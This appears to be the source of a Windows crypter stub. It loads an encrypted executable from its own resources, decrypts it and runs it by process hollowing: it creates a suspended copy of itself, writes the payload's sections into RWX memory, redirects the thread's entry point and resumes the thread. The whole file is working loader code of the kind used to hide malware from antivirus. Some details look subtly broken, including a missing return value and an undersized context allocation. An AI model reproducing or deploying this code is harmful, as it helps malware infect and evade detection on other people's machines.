#include <stdio.h>
#include <windows.h>
#include <vector>
#include "../encryption.h"
#include "resource.h"

#ifdef _DEBUG
#define PRINT_INFO(...) printf(__VA_ARGS__); printf("\n");fflush(stdout);
#define PRINT_ERROR(...) printf("[ERROR]");printf(__VA_ARGS__); printf("| GetLastError=%d\n",GetLastError());fflush(stdout);
#else
#define PRINT_INFO(...){}
#define PRINT_ERROR(...){}
#endif

#ifdef _WIN64
typedef DWORD64 MINT;
#else
typedef DWORD MINT;
#endif


bool GetResource(int resourceID, std::vector<char>& rsrc_buffer) {
    HRSRC rsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), MAKEINTRESOURCE(BINARY_FILE));

	if (!rsrc) {
		PRINT_ERROR("Error finding resource %d", GetLastError());
		return false;
	}
    unsigned int rsrcsize = SizeofResource(NULL, rsrc);

    if (!rsrcsize) {
        PRINT_ERROR("Error getting resource size");
        return false;
    }
    HGLOBAL rsrcdata = LoadResource(NULL, rsrc);
    if (!rsrcdata) {
        PRINT_ERROR("Error loading resource");
        return false;
    }
    void* pbindata = LockResource(rsrcdata);
    if (!pbindata) {
        PRINT_ERROR("Error loacking resource");
        return false;
    }
    rsrc_buffer.resize(rsrcsize);
    memcpy(rsrc_buffer.data(), pbindata, rsrcsize);
}

//Will load and run the image (similar to LoadLibraryA)

bool runImage(void* image) {
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI = {0};
	STARTUPINFOA SI = {0};

	CONTEXT* CTX;

	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(MINT(image) + DOSHeader->e_lfanew); // Initialize

	GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		PRINT_ERROR("Error resource is not a IMAGE_NT_SIGNATURE");
		return false;
	}

	// Create a new instance of current process
	if (!CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
		PRINT_ERROR("Error creating new process");
		return false;
	}

	// Allocate memory for the context.
	CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
	CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

	// If context is in thread
	if (!GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
		PRINT_ERROR("Error retriveing context");
		return false;
	}

	// Read instructions
	//ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
	pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!pImageBase) {
		PRINT_ERROR("Error allocating memory on target process");
		return false;
	}

	// Write headers to process
	WriteProcessMemory(PI.hProcess, pImageBase, image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

	//Write sections to process
	for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++){
		SectionHeader = PIMAGE_SECTION_HEADER(MINT(image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (count * sizeof(IMAGE_SECTION_HEADER)));

		WriteProcessMemory(PI.hProcess, LPVOID(MINT(pImageBase) + SectionHeader->VirtualAddress),
			LPVOID(MINT(image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
	
	}

#ifdef _WIN64
	WriteProcessMemory(PI.hProcess, LPVOID(CTX->Rdx + sizeof(LPVOID) * 2), LPVOID(&NtHeader->OptionalHeader.ImageBase), sizeof(LPVOID), 0);

	// Move address of entry point to the rcx register
	CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#else
	WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

	// Move address of entry point to the eax register
	CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#endif

	SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
	ResumeThread(PI.hThread); //´Start the process/call main()

	return true;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    std::vector<char> resourceBuffer;
    if(!GetResource(IDR_ENCRYPTED_FILE1, resourceBuffer)) {
        return 0;
    }
	PRINT_INFO("Resource with %d bytes",resourceBuffer.size());

	encryptDecrypt(resourceBuffer);
	if(runImage(resourceBuffer.data()))
		PRINT_INFO("Resource loaded with success");


    getchar();
    return 1;
}